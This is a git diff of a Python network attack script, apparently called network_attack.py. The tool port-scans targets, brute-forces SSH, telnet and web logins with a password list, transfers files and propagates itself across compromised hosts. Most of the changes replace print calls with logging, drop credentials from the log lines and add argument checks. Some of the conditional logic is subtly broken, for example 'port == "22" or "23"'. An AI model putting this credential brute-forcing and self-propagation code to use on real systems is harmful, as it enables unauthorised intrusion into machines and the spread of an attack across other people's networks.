@@ -1,4 +1,7 @@
 #!/usr/bin/python3
+# TODO: Add param and return keywords to block comments with the necessary
+#  contents to clarify what's being passed in and out. Maybe look at some
+#  automatic documentation / keyword solutions? (Andrew)
 
 # from scapy.all import *
 # For use when adding new functionality with scapy, be sure to statically
@@ -11,35 +14,38 @@ from scapy.utils import subprocess, os
 from telnetlib import Telnet
 from time import sleep
 from paramiko import SSHClient, AutoAddPolicy
+import logging
 import requests
 import strings
 
 """
  - Importing modules from scapy for Packet Crafting and Sending / Sniffing.
  - Importing telnetlib for telnet operations.
- - Importing Paramiko for ssh operations.
+ - Importing sleep to allow network processes time to complete.
+ - Importing from paramiko for ssh operations.
+ - Importing logging to safely log sensitive, error or debug info.
  - Importing requests for web based operations.
  - Importing strings for use of the external strings resources.
 """
 
 """
 ===PLEASE READ===
-Functions and methods are organised alphabetically with the exception of the 
-main method specified last. Every function has a block comment explaining what 
+Functions and methods are organised alphabetically with the exception of the
+main method specified last. Every function has a block comment explaining what
 it does.
 """
 
 
 def additional_attacks(arguments, ip, port, username,
-                       transfer_file_filename, service):
+                       transfer_file_filename):
     """
     This function passes the appropriate arguments to and runs the transferring
     file and propagating functions, these functions contain the check to stop
     them from being run if the appropriate arguments aren't used.
     """
     try_transferring_file(arguments, ip, port, username,
-                          transfer_file_filename, service)
-    try_propagating(arguments, ip, port, username, service)
+                          transfer_file_filename)
+    try_propagating(arguments, ip, port, username)
 
 
 def append_lines_from_file_to_list(file):
@@ -68,7 +74,7 @@ def assigning_values(arguments):
             passwords_filename = arguments[arguments.index("-f") + 1]
             return ip_list, target_ports, target_username, passwords_filename
         except RuntimeError:
-            print(strings.ip_list_cannot_be_read(ip_addresses_filename))
+            logging.error(strings.ip_list_not_read(ip_addresses_filename))
             gtfo_and_rtfm()
 
 
@@ -147,6 +153,32 @@ def check_telnet_data(string_to_check, data):
     return False
 
 
+def checking_arguments(arguments):
+    """
+    This function checks if the arguments are appropriately given and if
+    they're not it calls the help function and kicks them out. There's also a
+    check for the help argument itself. It'll try to assign the values if the
+    proper arguments are given, and they're valid
+    :param arguments: Arguments passed in by the user themselves
+    :return values[0]: List of IP addresses
+    :return values[1]: Ports and subsequently services to target
+    :return values[2]: Username to target
+    :return values[3]: Filename for a file containing passwords
+    """
+    if (("-t" or "-L" in arguments) and "-p" and "-u" and "-f" in arguments
+            and len(arguments) >= 8 and "-h" and "--help" not in arguments):
+        try:
+            values = assigning_values(arguments)
+            return values[0], values[1], values[2], values[3]
+
+        except RuntimeError:
+            logging.error("Failed assigning values (maybe null)")
+            gtfo_and_rtfm()
+    else:
+        logging.error("Parameter misuse, check help text below")
+        gtfo_and_rtfm()
+
+
 def connect_ssh_client(ip, port, username, password):
     """
     This function checks to see if an SSH connection can be established and if
@@ -158,14 +190,13 @@ def connect_ssh_client(ip, port, username, password):
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
         client.close()
-        print(strings.connection_status("SSH", ip, port, username, password,
-                                        "Successful"))
+        logging.info(strings.connection_status("SSH", ip, port, "Successful"))
         return True
 
     except RuntimeError:
         client.close()
-        print(strings.connection_status("SSH", ip, port, username, password,
-                                        "Unsuccessful"))
+        logging.debug(strings.connection_status("SSH", ip, port,
+                                                "Unsuccessful"))
         return False
 
 
@@ -182,17 +213,17 @@ def connect_telnet(ip, port, username, password):
         tel.write((str(password) + "\n").encode("ascii"))
 
         data = tel.read_until("Welcome to".encode("ascii"), timeout=4)
-        print(strings.connection_status("telnet", ip, port, username, password,
-                                        "Successful"))
+        logging.info(strings.connection_status("telnet", ip, port,
+                                               "Successful"))
         if check_telnet_data("Welcome to", data):
             return True
-        print(strings.connection_status("telnet", ip, port, username, password,
-                                        "Unsuccessful"))
+        logging.debug(strings.connection_status("telnet", ip, port,
+                                                "Unsuccessful"))
         return False
 
     except RuntimeError:
-        print(strings.connection_status("telnet", ip, port, username, password,
-                                        "Unsuccessful"))
+        logging.debug(strings.connection_status("telnet", ip, port,
+                                                "Unsuccessful"))
         return False
 
 
@@ -206,11 +237,10 @@ def connect_web(ip, port, username, password):
         send_post_request_with_login(ip, port, username, password)
         attempt_succeeded = True
     except RuntimeError:
-        print(strings.connection_status("web", ip, port, username, password,
-                                        "Unsuccessful"))
+        logging.debug(strings.connection_status("web", ip, port,
+                                                "Unsuccessful"))
     if attempt_succeeded:
-        print(strings.connection_status("web", ip, port, username, password,
-                                        "Successful"))
+        logging.info(strings.connection_status("web", ip, port, "Successful"))
     return attempt_succeeded
 
 
@@ -245,11 +275,11 @@ def cycle_through_subnet(ip_list, interface):
     return ip_list
 
 
-def file_error_handler(filename):
+def file_error_handler():
     """
     This function handles errors related to the processing of files.
     """
-    print(strings.filename_processing_error(filename))
+    print(strings.FILENAME_PROCESSING_ERROR)
     gtfo_and_rtfm()
 
 
@@ -407,12 +437,11 @@ def send_post_request_with_login(ip, port, username, password):
                              data={"username": username, "password": password},
                              timeout=4)
     if response:
-        print(strings.connection_status("web", ip, port, username, password,
-                                        "Successful"))
+        logging.info(strings.connection_status("web", ip, port, "Successful"))
         return str(username) + ":" + str(password)
     else:
-        print(strings.connection_status("web", ip, port, username, password,
-                                        "Unsuccessful"))
+        logging.debug(strings.connection_status("web", ip, port,
+                                                "Unsuccessful"))
         return None
 
 
@@ -470,24 +499,20 @@ def try_attack(ip, port, target_username, password_list,
     is successful it will then check the need for additional attacks specified
     by the end user.
     """
-    ip_address_and_port = str(ip) + ":" + str(port)
-    print("Now testing the following address: " + ip_address_and_port + "...")
+    logging.info("Now testing an IP address and port pair")
     if scan_port(ip, port):
-        print(ip_address_and_port + " is open.")
+        logging.info("Found an open IP address and port pair")
         bruteforce_login_details = try_bruteforce(ip, port, target_username,
-                                                  password_list,
-                                                  ip_address_and_port)
+                                                  password_list)
         if bruteforce_login_details[0]:
             additional_attacks(arguments, ip, port,
                                bruteforce_login_details[0],
-                               transfer_file_filename,
-                               bruteforce_login_details[1])
+                               transfer_file_filename)
     else:
-        print(ip_address_and_port + " is closed.")
+        print("This IP address and port pair is closed.")
 
 
-def try_bruteforce(ip, port, target_username, password_list,
-                   ip_address_and_port):
+def try_bruteforce(ip, port, target_username, password_list):
     """
     This function will try to bruteforce a specific service depending on the
     port supplied. If it gets a successful login then it will return the login
@@ -504,12 +529,12 @@ def try_bruteforce(ip, port, target_username, password_list,
     service = service_switch.get(str(port))
     bruteforce = bruteforce_service(ip, port, target_username, password_list)
     if bruteforce:
-        print("A working username and password for " + str(service)
-              + " was found: " + str(bruteforce))
+        logging.info("A working username and password for " + str(service)
+                     + " was found.")
         return str(bruteforce), service
     else:
-        print("It was impossible to bruteforce: " + ip_address_and_port
-              + ", that's rough buddy. :(")
+        logging.debug("It was impossible to bruteforce this IP address and"
+                      " port")
     return None, service
 
 
@@ -525,7 +550,7 @@ def try_password_for_service(ip, port, username, password):
             "23": lambda: connect_telnet(ip, port, username, password),
             "80": lambda: connect_web(ip, port, username, password),
             "8080": lambda: connect_web(ip, port, username, password),
-            "8888": lambda: connect_web(ip, port, username, password)
+            "8888": lambda: connect_web(ip, port, username, password),
         }
         connect_service = connect_service_switch.get(str(port))
         if connect_service():
@@ -536,7 +561,7 @@ def try_password_for_service(ip, port, username, password):
         return ""
 
 
-def try_propagating(arguments, ip, port, bruteforce, service):
+def try_propagating(arguments, ip, port, bruteforce):
     """
     This function attempts propagation of the network_attack.py script over
     the network. If it succeeds we alert the user and let them know what
@@ -548,15 +573,16 @@ def try_propagating(arguments, ip, port, bruteforce, service):
     if "-P" in arguments and (port == "22" or "23"):
         propagated = propagate_script(ip, port, bruteforce)
         if propagated:
-            print("Script propagated over " + service + ".")
+            logging.info("Script propagated over  this port")
         else:
-            print("Script couldn't be propagated over " + service + ".")
+            logging.debug("Script couldn't be propagated over this port")
     else:
-        print("Requirement to propagate script not specified, skipping...")
+        logging.info("Requirement to propagate script not specified,"
+                     " skipping...")
 
 
 def try_transferring_file(arguments, ip, port, bruteforce,
-                          transfer_file_filename, service):
+                          transfer_file_filename):
     """
     This function attempts transferring a user specified file across the
     network. If it succeeds we alert the user and let them know transferring
@@ -569,13 +595,11 @@ def try_transferring_file(arguments, ip, port, bruteforce,
         transferred = transfer_file(ip, port, bruteforce,
                                     transfer_file_filename)
         if transferred:
-            print("File " + str(transfer_file_filename) + " transferred over "
-                  + service + ".")
+            logging.info("File transferred over port 22 or 23")
         else:
-            print("File " + str(transfer_file_filename)
-                  + " couldn't be transferred over " + service + ".")
+            logging.debug("File couldn't be transferred over port 22 or 23")
     else:
-        print("Requirement to transfer file not specified, skipping...")
+        logging.info("Requirement to transfer file not specified, skipping...")
 
 
 def validate_file_exists(filename):
@@ -585,6 +609,5 @@ def validate_file_exists(filename):
     Just kidding we show the help screen and exit gracefully.
     """
     if not os.path.isfile(filename):
-        print("!!!ERROR: THE FOLLOWING FILE DOES NOT EXIST: " + filename
-              + "!!!")
+        logging.error("A specified file does not exist")
         gtfo_and_rtfm()
